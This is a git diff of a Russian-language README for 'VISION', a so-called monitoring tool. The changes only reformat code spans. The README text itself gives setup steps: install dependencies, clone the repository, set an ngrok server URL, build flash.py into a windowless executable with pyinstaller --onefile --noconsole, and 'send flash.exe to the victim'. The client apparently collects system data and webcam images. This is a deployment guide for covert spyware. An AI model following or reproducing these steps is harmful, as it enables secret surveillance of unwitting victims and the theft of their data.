@@ -36,12 +36,12 @@ _**VISION** - это система мониторинга, предназнач
 - `requests` — Библиотека для отправки HTTP-запросов, используемая для передачи данных между клиентом и сервером. (Клиентская часть)
 
 Команда для установки всех зависимостей.  
-`pip install Flask pyinstaller opencv-python requests` 
+```pip install Flask pyinstaller opencv-python requests```
 
 ## Быстрый старт
 
 1.Установите VISION с GitHub напрямую или воспользовавшись командой:  
-`git clone https://github.com/hvru24/vision_ash/tree/main`  
+```git clone https://github.com/hvru24/vision_ash/tree/main```
 
 2.Установите [все зависимости](#необходимые-зависимости) для серверной части.  
 
@@ -56,7 +56,7 @@ SERVER_URL = "https://example.ngrok-free.app"
 ```  
 
 6.Соберите flash.py в исполняемый файл (exe). Введите команду из директории `VISION`:  
-`pyinstaller --onefile --noconsole flash.py`  
+```pyinstaller --onefile --noconsole flash.py```
 
 7.Перейдите в созданную папку `dist` и отправьте flash.exe жертве.
 
@@ -69,7 +69,7 @@ SERVER_URL = "https://example.ngrok-free.app"
 
 Установите [все зависимости](#необходимые-зависимости) для серверной части.
 
-Используйте команду `pip install Flask requests`.
+Используйте команду ```pip install Flask requests```.
 
 ### Импорт библиотек — `server.py`
 
@@ -251,11 +251,11 @@ def get_system_data():
 
 Перед сборкой исполняемого файла, необходимо установить [все зависимости](#необходимые-зависимости) для клиентской части.
 
-Используйте команду `pip install pyinstaller opencv-python requests`.
+Используйте команду ```pip install pyinstaller opencv-python requests```.
 
 ### Сборка исполняемого файла
 
-Установив `pyinstaller`, воспользуйтесь командой `pyinstaller --onefile --noconsole flash.py` из директории `VISION` для сборки исполняемого файла.  
+Установив `pyinstaller`, воспользуйтесь командой ```pyinstaller --onefile --noconsole flash.py``` из директории `VISION` для сборки исполняемого файла.  
 Параметр `--onefile` позволяет собрать все зависимости и скрипт в один файл. `--noconsole` исключает запуск консольного окна.
 
 После сборки и запуска сервера, перейдите в созданную папку `dist` и отправьте `flash.exe` жертве.
